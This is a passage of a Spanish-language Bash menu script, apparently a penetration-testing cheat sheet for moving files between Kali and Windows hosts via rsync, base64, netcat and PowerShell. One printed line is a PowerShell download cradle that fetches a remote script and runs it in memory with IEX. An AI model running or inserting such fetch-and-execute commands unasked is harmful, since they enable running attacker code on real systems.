    echo
    echo -e "${YELLOW}Alternativa con pipeline:${NC}"
    echo "(New-Object Net.WebClient).DownloadString('http://<IP_WINDOWS>/script.ps1') | IEX"
}

# Función para implementar Kali → Kali con Rsync
implement_kali_to_kali_rsync() {
    echo -e "${BLUE}=== Transferencia Kali → Kali usando Rsync ===${NC}"
    echo -e "${YELLOW}PASO 1: En Kali destino (receptor)${NC}"
    echo "1. Iniciar el servidor rsync:"
    echo "rsync --daemon --config=/etc/rsyncd.conf"
    echo
    echo -e "${YELLOW}PASO 2: En Kali origen (emisor)${NC}"
    echo "1. Transferir el archivo:"
    echo "rsync -avz archivo.sh <IP_KALI_DESTINO>::module/"
    echo
    echo -e "${YELLOW}Alternativa con SSH:${NC}"
    echo "rsync -avz -e ssh archivo.sh usuario@<IP_KALI_DESTINO>:/ruta/destino/"
}

# Función para implementar Windows → Kali con Base64
implement_windows_to_kali_base64() {
    echo -e "${BLUE}=== Transferencia Windows → Kali usando Base64 ===${NC}"
    echo -e "${YELLOW}PASO 1: En Windows (máquina origen)${NC}"
    echo "1. Codificar el archivo en base64:"
    echo '$content = Get-Content -Path "archivo.exe" -Encoding Byte'
    echo '$base64 = [Convert]::ToBase64String($content)'
    echo '$base64 | Out-File -FilePath "archivo.exe.b64"'
    echo
    echo -e "${YELLOW}PASO 2: En Kali Linux (máquina destino)${NC}"
    echo "1. Decodificar el archivo:"
    echo "base64 -d archivo.exe.b64 > archivo.exe"
    echo
    echo -e "${YELLOW}Alternativa con Python:${NC}"
    echo "python3 -c 'import base64; f=open(\"archivo.exe.b64\",\"r\"); data=base64.b64decode(f.read()); f.close(); f=open(\"archivo.exe\",\"wb\"); f.write(data); f.close()'"
}

# Bucle principal
while true; do
    show_menu
    read -r option

    case $option in
        1)
            while true; do
                show_kali_to_windows_menu
                read -r k2w_option

                case $k2w_option in
                    1) implement_scp ;;
                    2) implement_kali_to_windows_python_powershell ;;
                    3) implement_netcat ;;
                    4) implement_ftp_transfers ;;
                    5) implement_kali_to_windows_smb ;;
                    6) implement_kali_to_windows_base64 ;;
                    7) break ;;
                    *) echo -e "${RED}Opción inválida${NC}" ;;
                esac

                echo
                read -p "Presione Enter para continuar..."
            done
            ;;
        2)
            while true; do
                show_windows_to_windows_menu
                read -r w2w_option

                case $w2w_option in
                    1) implement_powershell_web_downloads ;;
                    2) implement_windows_to_windows_smb ;;
                    3) implement_ftp_transfers ;;
                    4) implement_alternative_methods ;;
                    5) implement_base64 ;;
                    6) implement_windows_to_windows_fileless ;;
                    7) implement_powershell_fileless ;;
                    8) break ;;
                    *) echo -e "${RED}Opción inválida${NC}" ;;
                esac

                echo
                read -p "Presione Enter para continuar..."
            done
            ;;
        3)
            while true; do
                show_kali_to_kali_menu
                read -r k2k_option

                case $k2k_option in
                    1) implement_scp ;;
                    2) implement_kali_to_kali_netcat ;;
                    3) implement_python ;;
                    4) implement_ftp_transfers ;;
                    5) implement_base64 ;;
                    6) implement_kali_to_kali_rsync ;;
                    7) break ;;
                    *) echo -e "${RED}Opción inválida${NC}" ;;
                esac

                echo
                read -p "Presione Enter para continuar..."
            done
            ;;
        4)
            while true; do
                show_windows_to_kali_menu
                read -r w2k_option

                case $w2k_option in
                    1) implement_windows_to_kali_powershell ;;
                    2) implement_ftp_transfers ;;
                    3) implement_netcat ;;
                    4) implement_windows_to_kali_base64 ;;
                    5) break ;;
                    *) echo -e "${RED}Opción inválida${NC}" ;;
                esac

                echo
                read -p "Presione Enter para continuar..."
            done
            ;;
        5)
            echo -e "${GREEN}Saliendo...${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}Opción inválida${NC}" ;;
    esac

    echo
    read -p "Presione Enter para continuar..."
done 
